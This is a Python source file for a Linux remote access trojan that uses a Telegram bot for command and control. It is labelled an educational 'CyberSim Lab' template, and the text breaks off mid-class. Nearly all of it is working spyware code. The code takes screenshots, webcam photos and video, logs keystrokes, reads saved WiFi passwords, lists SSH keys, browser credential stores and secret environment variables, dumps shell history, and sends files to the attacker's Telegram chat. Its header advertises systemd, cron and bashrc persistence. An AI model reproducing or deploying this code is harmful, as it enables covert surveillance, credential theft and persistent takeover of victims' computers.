#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSim Lab - TELEGRAM BOT C2 v5.0 Linux (Educational Only)

Linux-SPECIFIC FEATURES:
  - Screenshot, Webcam, Keylogger, Shell, Files
  - Clipboard, WiFi, System Info, Passwords
  - Mic recording (arecord/ffmpeg), Video recording
  - AUTO-INSTALL all dependencies (pip3)
  - Systemd service persistence
  - Cron job persistence
  - Bash RC backdoor
  - Watchdog process monitor
  - Daemon mode with PID file lock
  - Start/Stop notifications to Telegram

Usage:
  chmod +x rat_linux_template.py && python3 rat_linux_template.py
  sudo python3 rat_linux_template.py --install   # Full stealth setup
  python3 rat_linux_template.py --uninstall      # Remove persistence
  python3 rat_linux_template.py --status         # Check status
  python3 rat_linux_template.py --daemon         # Run as background daemon
  python3 rat_linux_template.py --watchdog       # Monitor daemon, restart if died
"""

import os
import sys
import time
from datetime import datetime
import subprocess
import threading
import signal
import json
import shutil
import fcntl
import atexit
import argparse
import requests

# ============================================================
# TEMPLATE PLACEHOLDERS - Replaced by CyberSim Lab Dashboard
# ============================================================
BOT_TOKEN = '__BOT_TOKEN__'
ADMIN_CHAT_ID = __CHAT_ID__

# ============================================================
# CONSTANTS & PATHS
# ============================================================
VERSION = "5.0"
PLATFORM = "Linux"
WORKSPACE = os.path.join(os.path.expanduser('~'), ".local", ".rat_tg_workspace")
KEYLOG_FILE = os.path.join(WORKSPACE, "keylogs.txt")
PID_FILE = os.path.join(WORKSPACE, "daemon.pid")
WATCHDOG_PID_FILE = os.path.join(WORKSPACE, "watchdog.pid")
LOG_FILE = os.path.join(WORKSPACE, "daemon.log")
BACKUP_DIR = os.path.join(os.path.expanduser('~'), ".local", ".system_update")
SERVICE_PATH = "/etc/systemd/system/system-update.service"
POLL_INTERVAL = 3
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB max for Telegram uploads


# ============================================================
# ANSI COLOR CLASS
# ============================================================
class C:
    """ANSI color escape codes for terminal output."""
    R = '\033[91m'       # Red
    G = '\033[92m'       # Green
    Y = '\033[93m'       # Yellow
    B = '\033[94m'       # Blue
    M = '\033[95m'       # Magenta
    CY = '\033[96m'      # Cyan
    W = '\033[97m'       # White
    BD = '\033[1m'       # Bold
    DM = '\033[2m'       # Dim
    RS = '\033[0m'       # Reset


# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def ensure_workspace():
    """Create workspace directories if they don't exist."""
    for d in [WORKSPACE, BACKUP_DIR]:
        os.makedirs(d, exist_ok=True)


def log(msg, color=C.W):
    """Print colored message to terminal and append to log file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(f"{color}{line}{C.RS}")


def send_telegram(text, parse_mode="HTML"):
    """Send a text message to admin via Telegram Bot API."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        resp = requests.post(url, json=payload, timeout=15)
        result = resp.json()
        if not result.get("ok"):
            err = result.get("description", "unknown error")
            log(f"Telegram API error: {err}", C.R)
            # Retry without HTML if parse error
            if "parse" in err.lower() and parse_mode == "HTML":
                payload["parse_mode"] = None
                requests.post(url, json=payload, timeout=15)
    except Exception as e:
        log(f"send_telegram error: {e}", C.R)


def send_file(filepath, caption=""):
    """Send a file document to admin via Telegram."""
    if not os.path.exists(filepath):
        send_telegram(f"File not found: {filepath}")
        return False
    if os.path.getsize(filepath) > MAX_FILE_SIZE:
        send_telegram(f"File too large: {os.path.getsize(filepath)} bytes (max {MAX_FILE_SIZE})")
        return False
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(filepath, "rb") as f:
            files = {"document": (os.path.basename(filepath), f)}
            payload = {"chat_id": ADMIN_CHAT_ID}
            if caption:
                payload["caption"] = caption
            resp = requests.post(url, data=payload, files=files, timeout=120)
            if resp.status_code == 200:
                return True
            else:
                send_telegram(f"Send file failed: HTTP {resp.status_code}")
                return False
    except Exception as e:
        send_telegram(f"Send file error: {e}")
        return False


def send_photo(filepath, caption=""):
    """Send a photo to admin via Telegram."""
    if not os.path.exists(filepath):
        send_telegram(f"Photo not found: {filepath}")
        return False
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(filepath, "rb") as f:
            files = {"photo": (os.path.basename(filepath), f)}
            payload = {"chat_id": ADMIN_CHAT_ID}
            if caption:
                payload["caption"] = caption
            resp = requests.post(url, data=payload, files=files, timeout=120)
            return resp.status_code == 200
    except Exception as e:
        send_telegram(f"Send photo error: {e}")
        return False


def run_cmd(cmd, shell=False):
    """Execute a shell command and return combined stdout + stderr."""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True, timeout=30
        )
        output = result.stdout.strip()
        if result.stderr.strip():
            output += "\n" + result.stderr.strip()
        return output.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out (30s)"
    except Exception as e:
        return f"Command error: {e}"


def run_cmd_long(cmd, shell=False, timeout=120):
    """Execute a potentially long-running command with extended timeout."""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True, timeout=timeout
        )
        output = result.stdout.strip()
        if result.stderr.strip():
            output += "\n" + result.stderr.strip()
        return output.strip()
    except subprocess.TimeoutExpired:
        return f"Command timed out ({timeout}s)"
    except Exception as e:
        return f"Command error: {e}"


def is_root():
    """Check if the current process has root privileges."""
    return os.geteuid() == 0


def truncate(text, max_len=4000):
    """Truncate text to fit within Telegram message limits."""
    if len(text) > max_len:
        return text[:max_len] + f"\n... [truncated, total {len(text)} chars]"
    return text


# ============================================================
# SYSTEM INFORMATION GATHERING
# ============================================================

def get_system_info():
    """Gather comprehensive Linux system information."""
    info = []
    info.append(f"<b>CyberSim Lab RAT Linux v{VERSION}</b>")
    info.append(f"<b>Platform:</b> {PLATFORM}")
    info.append(f"<b>Hostname:</b> {run_cmd(['hostname']).strip()}")

    # OS release info
    os_info = run_cmd(['cat', '/etc/os-release'])
    for line in os_info.split('\n'):
        if line.startswith('PRETTY_NAME='):
            info.append(f"<b>OS:</b> {line.split('=', 1)[1].strip('\"')}")
            break

    # Kernel
    kernel = run_cmd(['uname', '-r']).strip()
    uname_full = run_cmd(['uname', '-a']).strip()
    info.append(f"<b>Kernel:</b> {kernel}")
    info.append(f"<b>Uname:</b> {truncate(uname_full, 200)}")

    # User info
    info.append(f"<b>User:</b> {os.environ.get('USER', 'unknown')}")
    info.append(f"<b>Home:</b> {os.path.expanduser('~')}")
    info.append(f"<b>Root:</b> {'Yes' if is_root() else 'No'}")
    info.append(f"<b>Python:</b> {sys.version.split()[0]}")

    # Uptime
    uptime = run_cmd(['uptime', '-p']).strip()
    if not uptime or uptime.startswith("uptime:"):
        uptime = run_cmd(['uptime']).strip()
    info.append(f"<b>Uptime:</b> {uptime}")

    # IP addresses
    local_ip = run_cmd(['hostname', '-I']).strip()
    info.append(f"<b>Local IP:</b> {local_ip}")

    try:
        ext_ip = run_cmd(['curl', '-s', '--max-time', '5', 'ifconfig.me']).strip()
        if ext_ip:
            info.append(f"<b>External IP:</b> {ext_ip}")
    except Exception:
        pass

    # Disk usage
    disk = run_cmd(['df', '-h', '/']).strip()
    info.append(f"<b>Disk (/):</b>\n<pre>{disk}</pre>")

    # Memory
    mem = run_cmd(['free', '-m']).strip()
    info.append(f"<b>Memory:</b>\n<pre>{mem}</pre>")

    # CPU info
    cpu_model = run_cmd(['grep', 'model name', '/proc/cpuinfo']).strip().split('\n')
    if cpu_model and cpu_model[0]:
        info.append(f"<b>CPU:</b> {cpu_model[0].split(':', 1)[1].strip()}")
    cpu_count = run_cmd(['nproc']).strip()
    info.append(f"<b>CPU Cores:</b> {cpu_count}")

    info.append(f"<b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    return "\n".join(info)


def get_network_info():
    """Get detailed network information."""
    info = []
    # Network interfaces
    interfaces = run_cmd(['ip', '-brief', 'addr']).strip()
    if not interfaces or 'Command' in interfaces:
        interfaces = run_cmd(['ifconfig']).strip()
    info.append(f"<b>Network Interfaces:</b>\n<pre>{interfaces}</pre>")

    # Routing table
    routes = run_cmd(['ip', 'route']).strip()
    if routes and 'Command' not in routes:
        info.append(f"<b>Routing:</b>\n<pre>{routes}</pre>")

    # Public IP
    try:
        ext_ip = run_cmd(['curl', '-s', '--max-time', '5', 'ifconfig.me']).strip()
        if ext_ip:
            info.append(f"<b>Public IP:</b> {ext_ip}")
            geo = run_cmd(['curl', '-s', '--max-time', '5', f'http://ip-api.com/json/{ext_ip}']).strip()
            if geo and '{' in geo:
                try:
                    geo_data = json.loads(geo)
                    city = geo_data.get('city', '')
                    country = geo_data.get('country', '')
                    isp = geo_data.get('isp', '')
                    if city or country:
                        info.append(f"<b>Location:</b> {city}, {country}")
                    if isp:
                        info.append(f"<b>ISP:</b> {isp}")
                except Exception:
                    pass
    except Exception:
        pass

    # DNS servers
    dns = run_cmd(['grep', 'nameserver', '/etc/resolv.conf']).strip()
    if dns:
        info.append(f"<b>DNS:</b>\n<pre>{dns}</pre>")

    return "\n".join(info)


# ============================================================
# SCREENSHOT (Linux)
# ============================================================

def take_screenshot():
    """Take a screenshot using available Linux tools."""
    path = os.path.join(WORKSPACE, f"screenshot_{int(time.time())}.png")
    commands = [
        ['import', '-window', 'root', '-resize', '1920x1080', path],
        ['scrot', '-z', path],
        ['gnome-screenshot', '-f', path],
        ['xfce4-screenshooter', '-f', '-s', path],
        ['xdotool', 'getactivewindow'],
    ]
    for cmd in commands:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if os.path.exists(path) and os.path.getsize(path) > 100:
                return path
        except Exception:
            continue
    # Fallback: try xwd + convert
    try:
        xwd_path = os.path.join(WORKSPACE, f"screen_{int(time.time())}.xwd")
        subprocess.run(['xwd', '-root', '-out', xwd_path], capture_output=True, timeout=10)
        if os.path.exists(xwd_path):
            subprocess.run(['convert', xwd_path, path], capture_output=True, timeout=10)
            os.remove(xwd_path)
            if os.path.exists(path) and os.path.getsize(path) > 100:
                return path
    except Exception:
        pass
    return None


# ============================================================
# WEBCAM (Linux)
# ============================================================

def take_webcam():
    """Capture webcam photo using fswebcam or ffmpeg."""
    path = os.path.join(WORKSPACE, f"webcam_{int(time.time())}.jpg")
    # Try fswebcam first
    try:
        result = subprocess.run(
            ['fswebcam', '-r', '1280x720', '--no-banner', '-S', '3', path],
            capture_output=True, text=True, timeout=15
        )
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
    except Exception:
        pass
    # Try ffmpeg with v4l2
    try:
        subprocess.run(
            ['ffmpeg', '-f', 'video4linux2', '-i', '/dev/video0',
             '-frames:v', '1', '-y', path],
            capture_output=True, text=True, timeout=15
        )
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
    except Exception:
        pass
    return None


def record_video(duration=5):
    """Record video from webcam using ffmpeg."""
    if duration < 1:
        duration = 1
    if duration > 30:
        duration = 30
    path = os.path.join(WORKSPACE, f"video_{int(time.time())}.mp4")
    try:
        subprocess.run(
            ['ffmpeg', '-f', 'video4linux2', '-i', '/dev/video0',
             '-t', str(duration), '-c:v', 'libx264', '-preset', 'ultrafast',
             '-y', path],
            capture_output=True, text=True, timeout=duration + 15
        )
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
    except Exception:
        pass
    return None


# ============================================================
# CLIPBOARD (Linux)
# ============================================================

def get_clipboard():
    """Get clipboard content using xclip or xsel."""
    # Try xclip first
    result = run_cmd(['xclip', '-selection', 'clipboard', '-o'])
    if 'Command not found' not in result and 'error' not in result.lower():
        return result if result else "(clipboard empty)"
    # Try xsel
    result = run_cmd(['xsel', '--clipboard', '--output'])
    if 'Command not found' not in result and 'error' not in result.lower():
        return result if result else "(clipboard empty)"
    # Try xdotool
    result = run_cmd(['xclip', '-selection', 'primary', '-o'])
    if 'Command not found' not in result and result:
        return result
    return "No clipboard tool available (install xclip or xsel)"


# ============================================================
# WIFI PASSWORDS (Linux)
# ============================================================

def get_wifi_passwords():
    """Parse NetworkManager connection files for WiFi passwords."""
    passwords = []
    conn_dir = "/etc/NetworkManager/system-connections/"
    if not os.path.isdir(conn_dir):
        return "No NetworkManager connections directory found"

    try:
        for fname in os.listdir(conn_dir):
            if fname.endswith('.nmconnection') or fname.endswith('.conf') or not '.' in fname:
                fpath = os.path.join(conn_dir, fname)
                try:
                    with open(fpath, 'r') as f:
                        content = f.read()
                    ssid = None
                    psk = None
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('ssid=') or line.startswith('SSID='):
                            ssid = line.split('=', 1)[1].strip()
                        elif line.startswith('psk=') or line.startswith('PSK='):
                            psk = line.split('=', 1)[1].strip()
                    if ssid and psk:
                        passwords.append(f"SSID: {ssid}  |  Password: {psk}")
                    elif ssid:
                        passwords.append(f"SSID: {ssid}  |  Password: (none or enterprise)")
                except PermissionError:
                    passwords.append(f"File: {fname}  |  (permission denied - need root)")
                except Exception:
                    pass
    except Exception as e:
        return f"Error reading connections: {e}"

    if passwords:
        return "\n".join(passwords)
    return "No saved WiFi passwords found"


def get_saved_wifi():
    """Get list of saved WiFi connections using nmcli."""
    result = run_cmd(['nmcli', '-t', '-f', 'NAME,TYPE,DEVICE', 'connection', 'show'])
    if 'Command not found' in result:
        return "nmcli not available"
    connections = []
    for line in result.split('\n'):
        if line and 'wifi' in line.lower():
            parts = line.split(':')
            name = parts[0] if parts else line
            device = parts[2] if len(parts) > 2 else "disconnected"
            connections.append(f"  {name} (device: {device})")
    if connections:
        return "Saved WiFi Connections:\n" + "\n".join(connections)
    return "No saved WiFi connections found"


def get_wifi_networks():
    """Scan for nearby WiFi networks."""
    result = run_cmd(['nmcli', '-t', '-f', 'SSID,SIGNAL,SECURITY', 'dev', 'wifi', 'list'])
    if 'Command not found' in result:
        return "nmcli not available"
    networks = []
    for line in result.split('\n'):
        if line:
            parts = line.split(':')
            if len(parts) >= 3 and parts[0]:
                networks.append(f"  {parts[0]} (signal: {parts[1]}%, security: {parts[2]})")
    if networks:
        return f"Nearby WiFi Networks ({len(networks)} found):\n" + "\n".join(networks[:30])
    return "No WiFi networks found"


# ============================================================
# BROWSER DATA & PASSWORDS (Linux)
# ============================================================

def check_passwords():
    """Check for browser data, SSH keys, and saved passwords."""
    findings = []

    # SSH keys
    ssh_dir = os.path.expanduser('~/.ssh')
    if os.path.isdir(ssh_dir):
        ssh_keys = []
        for f in os.listdir(ssh_dir):
            if 'id_' in f and not f.endswith('.pub'):
                ssh_keys.append(f)
        if ssh_keys:
            findings.append(f"<b>SSH Keys ({len(ssh_keys)}):</b> {', '.join(ssh_keys)}")
        known_hosts = os.path.join(ssh_dir, 'known_hosts')
        if os.path.exists(known_hosts):
            try:
                with open(known_hosts, 'r') as f:
                    hosts = f.readlines()
                findings.append(f"<b>Known Hosts:</b> {len(hosts)} entries")
            except Exception:
                pass

    # Browser data paths
    browser_paths = {
        'Chrome': os.path.expanduser('~/.config/google-chrome/Default'),
        'Firefox': os.path.expanduser('~/.mozilla/firefox'),
        'Chromium': os.path.expanduser('~/.config/chromium/Default'),
        'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default'),
        'Vivaldi': os.path.expanduser('~/.config/vivaldi/Default'),
        'Edge': os.path.expanduser('~/.config/microsoft-edge/Default'),
    }
    for browser, path in browser_paths.items():
        if os.path.isdir(path):
            files = os.listdir(path)
            has_login = any('Login' in f or 'login' in f for f in files)
            has_cookie = any('Cookie' in f or 'cookie' in f for f in files)
            has_history = any('History' in f or 'history' in f for f in files)
            has_bookmark = any('Bookmark' in f or 'bookmark' in f for f in files)
            details = []
            if has_login:
                details.append("logins")
            if has_cookie:
                details.append("cookies")
            if has_history:
                details.append("history")
            if has_bookmark:
                details.append("bookmarks")
            if details:
                findings.append(f"<b>{browser}:</b> found ({', '.join(details)})")
            else:
                findings.append(f"<b>{browser}:</b> profile exists")

    # WiFi passwords
    wifi_pwds = get_wifi_passwords()
    if 'No saved' not in wifi_pwds:
        findings.append(f"<b>WiFi Passwords:</b>\n<pre>{wifi_pwds}</pre>")

    # Gnome Keyring
    keyring_path = os.path.expanduser('~/.local/share/keyrings/')
    if os.path.isdir(keyring_path):
        keyrings = [f for f in os.listdir(keyring_path) if f.endswith('.keyring') or f.endswith('.login')]
        if keyrings:
            findings.append(f"<b>GNOME Keyring:</b> {', '.join(keyrings)}")

    # Environment credentials check
    env_secrets = []
    for var in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN',
                'GITLAB_TOKEN', 'DOCKER_HUB_PASSWORD', 'API_KEY', 'SECRET_KEY',
                'DATABASE_URL', 'DB_PASSWORD', 'MYSQL_PASSWORD', 'PGPASSWORD']:
        if os.environ.get(var):
            env_secrets.append(var)
    if env_secrets:
        findings.append(f"<b>Env Secrets Found:</b> {', '.join(env_secrets)}")

    if findings:
        return "\n".join(findings)
    return "No saved passwords or credentials found"


# ============================================================
# BASH HISTORY
# ============================================================

def get_bash_history():
    """Read bash command history."""
    history_paths = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.zsh_history'),
        os.path.expanduser('~/.local/share/fish/fish_history'),
    ]
    all_history = []
    for hpath in history_paths:
        if os.path.exists(hpath):
            try:
                with open(hpath, 'r', errors='ignore') as f:
                    lines = f.readlines()
                shell_name = os.path.basename(hpath).replace('_history', '').replace('.', '')
                all_history.append(f"--- {shell_name} ({len(lines)} commands) ---")
                # Show last 100 commands
                recent = [l.strip() for l in lines[-100:] if l.strip()]
                all_history.extend(recent)
            except PermissionError:
                all_history.append(f"--- {hpath}: permission denied ---")
            except Exception as e:
                all_history.append(f"--- {hpath}: {e} ---")
    if all_history:
        return "\n".join(all_history)
    return "No shell history found"


# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================

def get_env_variables():
    """Get environment variables (filter out sensitive display of PATH, etc)."""
    result = []
    for key, value in sorted(os.environ.items()):
        if key in ['PATH', 'LD_LIBRARY_PATH', 'PYTHONPATH', 'CLASSPATH']:
            # Show truncated for long paths
            if len(value) > 200:
                result.append(f"{key}={value[:200]}...")
            else:
                result.append(f"{key}={value}")
        else:
            val_display = value if len(value) < 500 else value[:500] + "..."
            result.append(f"{key}={val_display}")
    return "\n".join(result)


# ============================================================
# PROCESS LIST
# ============================================================

def get_process_list():
    """Get running process list."""
    return run_cmd(['ps', 'aux', '--sort=-%mem'])


# ============================================================
# OPEN PORTS
# ============================================================

def get_open_ports():
    """Get open listening ports using ss."""
    result = run_cmd(['ss', '-tlnp'])
    if 'Command not found' in result:
        result = run_cmd(['netstat', '-tlnp'])
    return result


# ============================================================
# INSTALLED PACKAGES
# ============================================================

def get_installed_apps():
    """Get list of installed packages."""
    # Try dpkg (Debian/Ubuntu)
    result = run_cmd(['dpkg', '-l'])
    if 'Command not found' not in result and result:
        pkg_count = run_cmd(['dpkg', '-l']).strip().split('\n')
        count = len([l for l in pkg_count if l.startswith('ii')])
        top_pkgs = [l.strip() for l in pkg_count if l.startswith('ii')][:30]
        return f"Total packages: {count}\n\n<pre>{truncate(chr(10).join(top_pkgs), 3500)}</pre>"
    # Try rpm (RedHat/Fedora)
    result = run_cmd(['rpm', '-qa'])
    if 'Command not found' not in result and result:
        pkgs = result.split('\n')
        return f"Total packages: {len(pkgs)}\n\n<pre>{truncate(chr(10).join(pkgs[:30]), 3500)}</pre>"
    return "Cannot determine installed packages"


# ============================================================
# BATTERY INFO
# ============================================================

def get_battery_info():
    """Get battery information."""
    # Try upower
    result = run_cmd(['upower', '-i', '/org/freedesktop/UPower/devices/battery_BAT0'])
    if 'Command not found' in result or 'object does not exist' in result:
        # Try acpi
        result = run_cmd(['acpi', '-V'])
        if 'Command not found' in result:
            # Try reading from sysfs
            batt_path = '/sys/class/power_supply/BAT0'
            if os.path.exists(batt_path):
                info = []
                try:
                    with open(os.path.join(batt_path, 'status'), 'r') as f:
                        info.append(f"Status: {f.read().strip()}")
                    with open(os.path.join(batt_path, 'capacity'), 'r') as f:
                        info.append(f"Capacity: {f.read().strip()}")
                except Exception:
                    pass
                return "\n".join(info) if info else "Battery data not readable"
            return "No battery detected"
    return result


# ============================================================
# USER INFO
# ============================================================

def get_user_info():
    """Get detailed user information."""
    info = []
    info.append(f"<b>User:</b> {os.environ.get('USER', 'unknown')}")
    info.append(f"<b>UID:</b> {os.getuid()}")
    info.append(f"<b>GID:</b> {os.getgid()}")
    info.append(f"<b>Effective UID:</b> {os.geteuid()}")
    info.append(f"<b>Home:</b> {os.path.expanduser('~')}")
    info.append(f"<b>Shell:</b> {os.environ.get('SHELL', 'unknown')}")
    info.append(f"<b>Root:</b> {'Yes' if is_root() else 'No'}")

    # Groups
    groups = run_cmd(['groups']).strip()
    if groups and 'Command not found' not in groups:
        info.append(f"<b>Groups:</b> {groups}")

    # Last login
    last_login = run_cmd(['last', '-1']).strip()
    if last_login and 'Command not found' not in last_login:
        info.append(f"<b>Last Login:</b>\n<pre>{last_login}</pre>")

    # Whoami verbose
    whoami = run_cmd(['whoami']).strip()
    info.append(f"<b>whoami:</b> {whoami}")

    return "\n".join(info)


# ============================================================
# NOTIFICATIONS (Linux)
# ============================================================

def get_notifications():
    """Check for Linux desktop notifications."""
    notifications = []

    # Check GNOME notifications
    notif_dir = os.path.expanduser('~/.local/share/notifications/')
    if os.path.isdir(notif_dir):
        try:
            for fname in os.listdir(notif_dir):
                if fname.endswith('.json'):
                    try:
                        with open(os.path.join(notif_dir, fname), 'r') as f:
                            data = json.load(f)
                        app = data.get('application', 'unknown')
                        body = data.get('body', '')
                        summary = data.get('summary', '')
                        timestamp = data.get('timestamp', '')
                        if body or summary:
                            notifications.append(f"[{app}] {summary}: {body}")
                    except Exception:
                        pass
        except Exception:
            pass

    # Check notify-send history via dbus
    try:
        result = run_cmd(['dbus-send', '--session', '--dest=org.freedesktop.Notifications',
                         '--type=method_call', '--print-reply',
                         '/org/freedesktop/Notifications',
                         'org.freedesktop.Notifications.GetServerInformation'])
        if 'method return' in result:
            notifications.append("(Notification daemon active)")
    except Exception:
        pass

    if notifications:
        return f"Notifications ({len(notifications)} found):\n" + "\n".join(notifications[-20:])
    return "No notifications found"


# ============================================================
# FILE BROWSER
# ============================================================

def browse_path(path):
    """Browse a directory and list files and folders."""
    if not path:
        path = os.path.expanduser('~')
    path = os.path.expanduser(path)
    if not os.path.exists(path):
        return f"Path not found: {path}"
    if not os.path.isdir(path):
        return f"Not a directory: {path}"

    dirs = []
    files = []
    try:
        for entry in sorted(os.listdir(path)):
            full = os.path.join(path, entry)
            if os.path.isdir(full):
                size = ""
                try:
                    total_size = sum(
                        os.path.getsize(os.path.join(dirpath, filename))
                        for dirpath, dirnames, filenames in os.walk(full)
                        for filename in filenames
                    )
                    if total_size > 1024 * 1024:
                        size = f" ({total_size / (1024 * 1024):.1f} MB)"
                    elif total_size > 1024:
                        size = f" ({total_size / 1024:.1f} KB)"
                except Exception:
                    pass
                dirs.append(f"  DIR  {entry}{size}")
            else:
                try:
                    fsize = os.path.getsize(full)
                    if fsize > 1024 * 1024:
                        size_str = f"{fsize / (1024 * 1024):.1f} MB"
                    elif fsize > 1024:
                        size_str = f"{fsize / 1024:.1f} KB"
                    else:
                        size_str = f"{fsize} B"
                except Exception:
                    size_str = "?"
                files.append(f"  FILE {entry} ({size_str})")
    except PermissionError:
        return f"Permission denied: {path}"

    result = f"📂 <b>Browsing:</b> {path}\n"
    result += f"<b>DIRS ({len(dirs)}):</b>\n" + "\n".join(dirs[:50])
    result += f"\n<b>FILES ({len(files)}):</b>\n" + "\n".join(files[:50])
    if len(dirs) > 50 or len(files) > 50:
        result += f"\n... (showing 50 of {len(dirs)} dirs, 50 of {len(files)} files)"
    return truncate(result)


# ============================================================
# FILE DOWNLOAD (from target to admin)
# ============================================================

def download_file(path):
    """Download a file or folder from target to admin."""
    path = os.path.expanduser(path)
    if not os.path.exists(path):
        return f"File not found: {path}"

    if os.path.isfile(path):
        success = send_file(path, f"File: {path}")
        if success:
            return f"File sent: {path} ({os.path.getsize(path)} bytes)"
        return "Failed to send file"

    if os.path.isdir(path):
        # Zip the directory
        zip_path = os.path.join(WORKSPACE, f"download_{int(time.time())}.zip")
        try:
            shutil.make_archive(zip_path.replace('.zip', ''), 'zip', path)
            zip_path_final = zip_path
        except Exception:
            # Try with tar
            tar_path = os.path.join(WORKSPACE, f"download_{int(time.time())}.tar.gz")
            try:
                subprocess.run(['tar', '-czf', tar_path, path], capture_output=True, timeout=60)
                zip_path_final = tar_path
            except Exception as e:
                return f"Failed to compress directory: {e}"

        if os.path.exists(zip_path_final) and os.path.getsize(zip_path_final) > 0:
            if os.path.getsize(zip_path_final) <= MAX_FILE_SIZE:
                success = send_file(zip_path_final, f"Directory: {path}")
                try:
                    os.remove(zip_path_final)
                except Exception:
                    pass
                if success:
                    return f"Directory sent as archive: {path}"
                return "Failed to send directory archive"
            else:
                try:
                    os.remove(zip_path_final)
                except Exception:
                    pass
                return f"Directory too large: {os.path.getsize(zip_path_final)} bytes"
        return "Failed to create archive"


# ============================================================
# LIVE SCREENSHOT SERIES
# ============================================================

def take_live_screenshots(interval=2):
    """Take 5 screenshots at given interval and send them."""
    send_telegram("Starting live screenshot series (5 shots)...")
    for i in range(5):
        path = take_screenshot()
        if path:
            send_photo(path, f"Live #{i+1}/5")
            try:
                os.remove(path)
            except Exception:
                pass
        else:
            send_telegram(f"Screenshot #{i+1} failed")
        if i < 4:
            time.sleep(interval)
    send_telegram("Live screenshot series complete")


# ============================================================
# FIND FILES
# ============================================================

def locate_file(name):
    """Find files matching a name pattern."""
    if not name:
        return "Usage: /locate <filename>"
    result = run_cmd_long(['find', '/', '-name', name, '-type', 'f'], timeout=30)
    lines = result.strip().split('\n')
    if len(lines) > 50:
        return f"Found {len(lines)} matches (showing first 50):\n" + "\n".join(lines[:50])
    if not result.strip() or 'No such file' in result:
        return f"No files found matching: {name}"
    return f"Found {len(lines)} matches:\n" + truncate(result)


# ============================================================
# KEYLOGGER MANAGER
# ============================================================

class KeyloggerManager:
    """Manages keyboard input logging using pynput on Linux (X11)."""

    def __init__(self):
        self.buffer = []
        self.running = False
        self.listener = None
        self.thread = None
        self.display_available = bool(os.environ.get('DISPLAY'))
        self.start_time = None
        self.key_count = 0

    def start(self):
        """Start the keylogger in a background thread."""
        if self.running:
            return "Keylogger is already running"
        if not self.display_available:
            return "Keylogger requires X11 display ($DISPLAY not set)"
        self.running = True
        self.start_time = datetime.now()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        return "Keylogger started"

    def _run(self):
        """Keylogger thread using pynput."""
        try:
            from pynput import keyboard

            def on_press(key):
                if not self.running:
                    return False
                try:
                    if key.char:
                        self.buffer.append(key.char)
                    elif key == keyboard.Key.space:
                        self.buffer.append(' ')
                    elif key == keyboard.Key.enter:
                        self.buffer.append('\n')
                    elif key == keyboard.Key.tab:
                        self.buffer.append('\t')
                    elif key == keyboard.Key.backspace:
                        if self.buffer:
                            self.buffer.pop()
                        else:
                            self.buffer.append('[BS]')
                    else:
                        self.buffer.append(f'[{key.name}]')
                    self.key_count += 1
                except AttributeError:
                    self.buffer.append(f'[{key}]')
                    self.key_count += 1

                # Auto-save buffer to disk periodically
                if len(self.buffer) >= 500:
                    self._save_buffer()

            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            self.listener.join()
        except ImportError:
            self.running = False
        except Exception as e:
            self.running = False
            log(f"Keylogger error: {e}", C.R)

    def _save_buffer(self):
        """Save current buffer to disk."""
        if self.buffer:
            try:
                with open(KEYLOG_FILE, 'a') as f:
                    f.write("".join(self.buffer))
                self.buffer.clear()
            except Exception:
                pass

    def stop(self):
        """Stop the keylogger."""
        was_running = self.running
        self.running = False
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
        self._save_buffer()
        return "Keylogger stopped" if was_running else "Keylogger was not running"

    def dump(self):
        """Save buffer and send keylog file."""
        self._save_buffer()
        if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > 0:
            send_file(KEYLOG_FILE, f"Keylog dump ({self.key_count} keys)")
            return f"Keylog sent ({self.key_count} keys total)"
        if self.buffer:
            # Save remaining buffer and send
            self._save_buffer()
            if os.path.exists(KEYLOG_FILE):
                send_file(KEYLOG_FILE, f"Keylog dump ({self.key_count} keys)")
                return f"Keylog sent ({self.key_count} keys total)"
        return "No keylog data available"

    def clear(self):
        """Clear keylog buffer and file."""
        self.buffer.clear()
        self.key_count = 0
        try:
            if os.path.exists(KEYLOG_FILE):
                os.remove(KEYLOG_FILE)
        except Exception:
            pass
        return "Keylog cleared"

    def get_status_text(self):
        """Get keylogger status information."""
        status = "ON" if self.running else "OFF"
        elapsed = ""
        if self.start_time and self.running:
            delta = datetime.now() - self.start_time
            hours, remainder = divmod(int(delta.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            elapsed = f" (running {hours}h {minutes}m {seconds}s)"
        file_size = 0
        if os.path.exists(KEYLOG_FILE):
            file_size = os.path.getsize(KEYLOG_FILE)
        return f"Status: {status}{elapsed}\nKeys captured: {self.key_count}\nBuffer: {len(self.buffer)} keys\nFile size: {file_size} bytes\nDisplay: {'Available' if self.display_available else 'Not available ($DISPLAY)'}"


# ============================================================
# MIC RECORDER (Linux)
# ============================================================

class MicRecorder:
    """Manages microphone recording using arecord/ffmpeg on Linux."""

    def __init__(self):
        self.recording = False
        self.process = None
        self.thread = None
        self.output_file = None

    def start(self):
